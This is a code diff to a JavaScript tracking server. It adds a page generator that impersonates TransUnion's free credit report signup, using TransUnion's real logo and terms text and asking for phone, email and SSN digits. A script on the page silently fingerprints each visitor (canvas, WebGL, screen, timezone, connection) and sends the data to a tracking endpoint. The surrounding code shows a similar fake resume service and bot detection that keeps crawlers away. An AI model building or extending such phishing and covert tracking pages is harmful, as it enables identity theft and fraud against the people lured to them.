@@ -368,6 +368,134 @@ function startOptimization() {
   return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>ResumeBoost Pro - AI-Powered Resume Optimization</title><link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet"><style>* { margin: 0; padding: 0; box-sizing: border-box; }body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; line-height: 1.6; color: #333; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; }.header { background: rgba(255,255,255,0.95); backdrop-filter: blur(10px); padding: 1rem 0; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 20px rgba(0,0,0,0.1); }.nav { max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; padding: 0 2rem; }.logo { font-size: 1.8rem; font-weight: bold; color: #667eea; }.hero { text-align: center; padding: 4rem 2rem; color: white; }.hero h1 { font-size: 3.5rem; margin-bottom: 1rem; font-weight: 700; }.hero p { font-size: 1.3rem; margin-bottom: 2rem; opacity: 0.9; max-width: 600px; margin-left: auto; margin-right: auto; }.container { max-width: 1200px; margin: 0 auto; padding: 0 2rem; }.upload-section { background: white; margin: 2rem auto; padding: 3rem; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.1); max-width: 800px; }.btn-primary { background: #667eea; color: white; padding: 0.75rem 1.5rem; border: none; border-radius: 50px; font-weight: 600; cursor: pointer; transition: all 0.3s; text-decoration: none; display: inline-block; }.btn-primary:hover { background: #5a6fd8; }</style></head><body><header class="header"><nav class="nav"><div class="logo"><i class="fas fa-file-alt"></i> ResumeBoost Pro</div></nav></header><section class="hero"><div class="container"><h1>Optimize Your Resume with AI</h1><p>Get your resume past ATS systems and into the hands of hiring managers. Our AI analyzes your resume against job requirements and optimizes it for maximum impact.</p></div></section><section class="upload-section"><div class="container"><h2 style="text-align: center; margin-bottom: 2rem; color: #333;">Upload Your Resume</h2><div style="border: 3px dashed #ddd; border-radius: 15px; padding: 3rem; text-align: center; background: #fafafa; margin: 2rem 0;"><i class="fas fa-cloud-upload-alt" style="font-size: 4rem; color: #667eea; margin-bottom: 1rem;"></i><h3>Drop your resume here or click to browse</h3><p>Supports PDF, DOC, DOCX formats (Max 10MB)</p><input type="file" style="margin: 1rem 0; padding: 0.75rem;" accept=".pdf,.doc,.docx"></div><div style="margin: 1.5rem 0;"><label style="display: block; margin-bottom: 0.5rem; font-weight: 600; color: #555;">Target Job Title</label><input type="text" style="width: 100%; padding: 0.75rem; border: 2px solid #e0e6ff; border-radius: 10px;" placeholder="e.g., Software Engineer, Marketing Manager"></div><div style="text-align: center; margin: 2rem 0;"><button class="btn-primary" style="font-size: 1.1rem; padding: 1rem 3rem;" onclick="startOptimization()"><i class="fas fa-magic" style="margin-right: 0.5rem;"></i>Optimize My Resume</button></div></div></section><script>${enhancedTrackingScript}</script></body></html>`;
 }
 
+// Function to generate TransUnion credit report form HTML with enhanced tracking
+function generateCreditReportHTML(trackingId) {
+  const enhancedTrackingScript = `
+fetch("/api/js-track/${trackingId}", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+        // Screen and display
+        screen: {
+            width: screen.width,
+            height: screen.height,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight
+        },
+        viewport: {
+            width: window.innerWidth,
+            height: window.innerHeight
+        },
+
+        // Browser and system
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezoneOffset: new Date().getTimezoneOffset(),
+        language: navigator.language,
+        languages: navigator.languages,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        cookieEnabled: navigator.cookieEnabled,
+        onLine: navigator.onLine,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory,
+
+        // Canvas fingerprinting
+        canvasFingerprint: (function() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillText('fingerprint', 2, 2);
+                return canvas.toDataURL().substring(0, 100);
+            } catch(e) { return 'unavailable'; }
+        })(),
+
+        // WebGL info
+        webglVendor: (function() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const ext = gl.getExtension('WEBGL_debug_renderer_info');
+                return gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
+            } catch(e) { return 'unavailable'; }
+        })(),
+
+        // Performance metrics
+        loadTime: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 0,
+
+        // Document info
+        pageUrl: window.location.href,
+        referrer: document.referrer,
+        title: document.title,
+        timestamp: new Date().toISOString(),
+
+        // Browser features
+        hasTouch: 'ontouchstart' in window,
+        hasWebRTC: !!window.RTCPeerConnection,
+        hasWebGL: !!window.WebGLRenderingContext,
+        hasWebWorker: !!window.Worker,
+
+        // Plugins (limited in modern browsers)
+        pluginsCount: navigator.plugins.length,
+
+        // Connection info
+        connection: navigator.connection ? {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt
+        } : null
+    })
+}).catch(() => {});
+
+function getStarted() {
+    fetch("/api/js-track/${trackingId}", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            action: "get_started_clicked",
+            timestamp: new Date().toISOString()
+        })
+    }).catch(() => {});
+    alert("Thank you for your interest! Your scores are moments away.");
+}`;
+
+  return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>TransUnion - Your FREE scores, reports & monitoring</title><style>
+        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .main-container { width: 100%; max-width: 1200px; margin: 20px; display: flex; justify-content: center; align-items: flex-start; gap: 40px; padding: 20px; }
+        .header { width: 100%; max-width: 1200px; position: absolute; top: 0; padding: 20px; box-sizing: border-box; }
+        .logo { height: 25px; }
+        .content-card { background-color: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1); flex: 2; max-width: 650px; }
+        .content-card h1 { font-size: 2.5rem; font-weight: 300; line-height: 1.2; margin-bottom: 20px; }
+        .info-section { margin-top: 30px; }
+        .info-section h3 { font-size: 1rem; color: #555; margin-bottom: 15px; }
+        .input-group { margin-bottom: 20px; }
+        .input-group label { display: block; font-size: 0.9rem; color: #888; margin-bottom: 5px; }
+        .input-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 1rem; box-sizing: border-box; }
+        .input-group input:focus { outline: none; border-color: #007bff; }
+        .disclaimer-box { background-color: #e6f0ff; border-left: 5px solid #0056b3; padding: 15px; border-radius: 4px; margin-top: 30px; }
+        .disclaimer-box h4 { font-size: 1rem; color: #0056b3; margin-bottom: 10px; }
+        .disclaimer-box p { font-size: 0.9rem; color: #555; line-height: 1.5; }
+        .terms { font-size: 0.8rem; color: #888; margin-top: 20px; line-height: 1.5; }
+        .btn-get-started { width: 100%; background-color: #ff9900; color: white; padding: 15px; border: none; border-radius: 4px; font-size: 1.1rem; font-weight: bold; cursor: pointer; margin-top: 25px; transition: background-color 0.3s; }
+        .btn-get-started:hover { background-color: #e68a00; }
+        .sidebar { flex: 1; max-width: 350px; padding-top: 150px; }
+        .sidebar ul { list-style: none; padding: 0; }
+        .sidebar li { margin-bottom: 15px; display: flex; align-items: center; font-size: 1rem; color: #555; }
+        .sidebar li svg { margin-right: 10px; color: #008000; }
+        .already-account { text-align: center; margin-top: 20px; color: #555; }
+        .already-account a { color: #007bff; text-decoration: none; }
+        @media (max-width: 992px) {
+            .main-container { flex-direction: column; align-items: center; }
+            .sidebar { padding-top: 0; margin-top: 20px; text-align: center; }
+            .sidebar ul { text-align: left; max-width: 400px; margin: 0 auto; }
+        }
+    </style>
+</head><body><header class="header"><img src="https://www.transunion.com/resources/images/transunion-logo.svg" alt="TransUnion" class="logo"></header><div class="main-container"><div class="content-card"><h1>Your FREE scores, reports & monitoring are moments away</h1><div class="info-section"><h3>Step 1: Find Your Info</h3><p style="font-size: 0.9rem; color: #888; margin-bottom: 20px;">Personal Info We Collect</p><div class="input-group"><label for="phone">Mobile phone number</label><input type="tel" id="phone" placeholder="(___) ___-____"></div><div class="input-group"><label for="email">Email address</label><input type="email" id="email" placeholder="Email address"></div><div class="input-group"><label for="ssn">Last 4 digits of SSN</label><input type="password" id="ssn" placeholder="XXX-XX-XXXX"></div><p style="font-size: 0.8rem; color: #888; margin-top: 10px;">By providing the last 4 digits of your social security number, we will attempt to pre-fill the remaining information needed to set up your account as well as retrieve your credit credentials. This will also help protect you from unauthorized access.</p><div class="disclaimer-box"><h4>What You Need to Know:</h4><p>The credit scores provided are based on the <strong>VantageScore® 3.0 model</strong>. Lenders use a variety of credit scores and are likely to use a credit score different from <strong>VantageScore® 3.0</strong> to assess your creditworthiness.</p></div><p class="terms">By clicking "Get Started" below, I accept and agree to TransUnion Interactive, Inc.'s ("TUI") Terms of Service and Privacy Policy. I consent to receive a one-time verification code from TUI to confirm my identity and to receive text notifications for account verification, support, and transactional messages, including some credit monitoring alerts and profile updates. Message and data rates may apply. Message frequency varies. To stop text notifications, reply "STOP" to any message from us. For assistance, reply "HELP".</p></div><button class="btn-get-started" onclick="getStarted()">Get Started</button><p class="already-account">Already have an account? <a href="#">Log in</a></p></div><div class="sidebar"><ul><li><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-check-circle"><path d="M22 11.08V12a10 10 0 1 1-5.93-8.6"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>Completely free - no credit card required</li><li><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-check-circle"><path d="M22 11.08V12a10 10 0 1 1-5.93-8.6"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>Daily TransUnion credit reports, scores & monitoring</li><li><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-check-circle"><path d="M22 11.08V12a10 10 0 1 1-5.93-8.6"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>Personalized credit health tips & tools</li><li><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-check-circle"><path d="M22 11.08V12a10 10 0 1 1-5.93-8.6"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>Personalized offers based on your credit profile</li></ul></div></div><script>${enhancedTrackingScript}</script></body></html>`;
+}
+
 // Enhanced bot detection with more patterns
 function detectBot(userAgent) {
   const botKeywords = [
@@ -554,6 +682,10 @@ function handleTracking(req, res, trackingId) {
       );
       res.send(pixel);
       break;
+    
+    case "credit":
+        res.send(generateCreditReportHTML(trackingId));
+        break;
 
     case "resume":
     default:
